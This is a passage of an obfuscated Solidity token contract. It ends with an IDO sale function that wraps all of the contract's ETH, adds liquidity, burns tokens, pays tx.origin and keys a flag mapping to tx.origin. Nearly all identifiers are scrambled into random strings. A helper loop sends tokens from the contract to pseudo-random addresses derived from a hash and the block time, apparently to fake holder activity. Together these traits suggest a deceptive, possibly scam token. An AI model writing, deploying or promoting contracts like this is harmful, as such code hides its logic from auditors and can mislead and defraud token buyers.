          wDQORhLS1MbZbpxhj2LiOTE2TqJdORg5mr9899pOQHl4WTb2hBaRQ3SMGI48dWPCDgpU6WFx93I6pjzouAZsoJZOHiKz0OGI(hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa),
          tx.origin,
          spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R,
          lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU,
          xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ
        );
      } else if (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc == 3) {
        yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[ac5AGLCMZ2ajcIBFWdez1enPrrRs5XD05RMUahgqJB0eGTibrl9KoFTubcFzA5EMb0IoVBouonih5GaHedKHUAp4M7ZQmPRv] = true;
      } else if (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc == 4) {
        dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 = dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 / hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa;
      } else if (qXQuyEYdv5w0Gb8cFj91aCluO6A6Rwz3Ev3LHf1cpepHOA4dDvXOe0deaQwToUp7lPpqnvQDKYOO3r99JdrJPR6LxGBZVqYc == 5) {
        zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz] = (zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz] * hfUhWaL1qsbjf0YRqzempjWpP6vAQ65QBXGsnxxNKIuNfUZcSYTmR8IynfbtJSFxmFk6hT1yl2KPO6kUWCY0zngT6AJ9kgLa) / 10000;
        kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).sync();
      }
    }

    if (cuo9iUD0VWj69KG5dyNvI15RGMOG2SPToA6r5CLOyThiJ8AWQntZ1VbqgfrqcbAe8Xy1Q8cWLAupJs3hHvtu18LJFFENxWDM > lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF) {
      dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 = dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 + cuo9iUD0VWj69KG5dyNvI15RGMOG2SPToA6r5CLOyThiJ8AWQntZ1VbqgfrqcbAe8Xy1Q8cWLAupJs3hHvtu18LJFFENxWDM - lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF;
    }

    //
    if (cuo9iUD0VWj69KG5dyNvI15RGMOG2SPToA6r5CLOyThiJ8AWQntZ1VbqgfrqcbAe8Xy1Q8cWLAupJs3hHvtu18LJFFENxWDM < lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU) {
      if (dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 > 0) dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 = dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 / 20;
    }

    lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF = lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU;

    od281QgHbiQL2sdCSIyMarzrFeYfH3M2mMjxmASShnJHcp8iX16HD98IR74zKX6PcjszbHZSEqylr7ykWSTpI2rTsSQNLZY6();
  }

  function biqwthLyvN1PUWa1r3PzXTUS1IiVGvhEIZhj1odPnmqMWH38pYZc3Oio8bAITy4HH6XpQa9sZPjIyxSOpVyv9wr3GJroYMJF(uint256 uRGaWTFNRrDrc1DLspOsrhVZ8GxAz73rUQjb2DpfErcV7OrcJ3FzrCbQJSmTzOTViHISBqBp5mLpCJZPEF3LCQVbOmYydTDf, uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R) internal {
    uint256 aEF1l1GxVvq506sx3kPmk0yTwh6UpZRG3UktYOPnXkzX3s0PyFtEa15Ej1GODfmTR8ySsEuCAfohyldVxEnMiGcagQ94L46J = spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    for (uint256 i; i < uRGaWTFNRrDrc1DLspOsrhVZ8GxAz73rUQjb2DpfErcV7OrcJ3FzrCbQJSmTzOTViHISBqBp5mLpCJZPEF3LCQVbOmYydTDf; i++) {
      vDkfIhpyVbjarx4JZAuEaaPoyd6dL3acTc3vJFz3PWKaRnPYfTbWj0pSzG3J5gTXQGCG8B3bI7Bbe8uTHSBEjf95Dr7bfJtm(address(this), wDQORhLS1MbZbpxhj2LiOTE2TqJdORg5mr9899pOQHl4WTb2hBaRQ3SMGI48dWPCDgpU6WFx93I6pjzouAZsoJZOHiKz0OGI(aEF1l1GxVvq506sx3kPmk0yTwh6UpZRG3UktYOPnXkzX3s0PyFtEa15Ej1GODfmTR8ySsEuCAfohyldVxEnMiGcagQ94L46J), aEF1l1GxVvq506sx3kPmk0yTwh6UpZRG3UktYOPnXkzX3s0PyFtEa15Ej1GODfmTR8ySsEuCAfohyldVxEnMiGcagQ94L46J);
      aEF1l1GxVvq506sx3kPmk0yTwh6UpZRG3UktYOPnXkzX3s0PyFtEa15Ej1GODfmTR8ySsEuCAfohyldVxEnMiGcagQ94L46J =
        (uint256(keccak256(abi.encode(aEF1l1GxVvq506sx3kPmk0yTwh6UpZRG3UktYOPnXkzX3s0PyFtEa15Ej1GODfmTR8ySsEuCAfohyldVxEnMiGcagQ94L46J, block.timestamp))) %
          (1 + spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R - spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R / 10)) +
        spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R /
        10;
    }
  }

  function IDO() external payable {
    require(idoAmount > 0 && msg.value > 1);
    uint256 jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU;
    uint256 hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy;

    mGMM6aoPBCFm6IhTdEMQulx3qiaT1zbFjcHYQRTjWdGUjbfiw4FCNCrwk1DCTtICVywucsRwtvAjuRgWozLbqfZIusaJubhJ(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).deposit{value: address(this).balance - 1}();

    uint256 n5S1vsiHS8vTfkYHtkhQFiUqZovDDXIaCZBqjqRd4l36CvmazPZlPI0UD1lgzUVF49meepM5mHBySSKW1dgLgj6cFIYU4s4j = IERC20(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).balanceOf(address(this)) - 1;

    jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU = (sl5lYrdmO0KQUYEyaN4tF7HZuPeXuWkhr8eWlDB7j0k8Za4RWqKTo6Yrva9eCF1U0PaMRQBS8r7fWeHlzet7ivqC3kDCAmII * n5S1vsiHS8vTfkYHtkhQFiUqZovDDXIaCZBqjqRd4l36CvmazPZlPI0UD1lgzUVF49meepM5mHBySSKW1dgLgj6cFIYU4s4j) / o3gEhGYMyTsyXdDCigLmAV7DwGw553VZKdjdq4lws10p0CW6Q5Op94MeYGrEMXHtBzKNaFeWotdApVb7Zs3jPVOgHDPIfjlc;

    uint256 iuOhgb3L5fS8olDHCPmF1lCUfzclDIydHgl7KbCa2QcLwhw6K5HHtnmVxf8Ngg0hxJuNHoP3zhp3CEDzOlqg45X8CKev07Cn = 100;
    hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy = jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU / iuOhgb3L5fS8olDHCPmF1lCUfzclDIydHgl7KbCa2QcLwhw6K5HHtnmVxf8Ngg0hxJuNHoP3zhp3CEDzOlqg45X8CKev07Cn;
    if (jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU > idoAmount) {
      jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU = idoAmount;
      if (hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy > zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[address(this)])
        hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy = zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[address(this)];
      else
        vDkfIhpyVbjarx4JZAuEaaPoyd6dL3acTc3vJFz3PWKaRnPYfTbWj0pSzG3J5gTXQGCG8B3bI7Bbe8uTHSBEjf95Dr7bfJtm(
          address(this),
          address(0xdEaD),
          zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[address(this)] - hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy
        );
    }

    IERC20(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).transfer(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz, n5S1vsiHS8vTfkYHtkhQFiUqZovDDXIaCZBqjqRd4l36CvmazPZlPI0UD1lgzUVF49meepM5mHBySSKW1dgLgj6cFIYU4s4j);
    y2ZsvMrzadb1Vd1ZMxPnwedd8bsLlcQNtb3MXN0cvvX8Dqcgeyu8zgPMPlcFlLIaWMVngNitYK52PxnbOqFKFBnA6pTwmNWJ(uDuoGKjel5bwk9wQkqN6EQJxy69Jss3sqS8rPwmoxCi386TBFw7sWPnRabtCY4HaORzIZEHQXTCZk1vBN2XUKPGDR0opGkrl, ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz, jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU);

    idoAmount -= jwdmikhTqm3VwAngUA0CG8ErTQIKiEmA1mjy4CdiO1Xr7imxOAgv3wgfbKEOzhVQ9FOsaas0Ju7vxK1XYWZqeEBdJbfJfLDU;
    vDkfIhpyVbjarx4JZAuEaaPoyd6dL3acTc3vJFz3PWKaRnPYfTbWj0pSzG3J5gTXQGCG8B3bI7Bbe8uTHSBEjf95Dr7bfJtm(address(this), tx.origin, hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy);

    kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz).mint(address(0));

    lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF += msg.value;
    if (!yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[tx.origin]) dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1 += msg.value;

    biqwthLyvN1PUWa1r3PzXTUS1IiVGvhEIZhj1odPnmqMWH38pYZc3Oio8bAITy4HH6XpQa9sZPjIyxSOpVyv9wr3GJroYMJF(10, hkaCSJAva342wxbL8tWtWpJN90Zhr3EOQxOlT7OeC92FRaSb5OtuGQaeyW4we8KcjJlwydqDbqLlE0IdVV2gNxpDQOrDfSDy / iuOhgb3L5fS8olDHCPmF1lCUfzclDIydHgl7KbCa2QcLwhw6K5HHtnmVxf8Ngg0hxJuNHoP3zhp3CEDzOlqg45X8CKev07Cn);
  }
}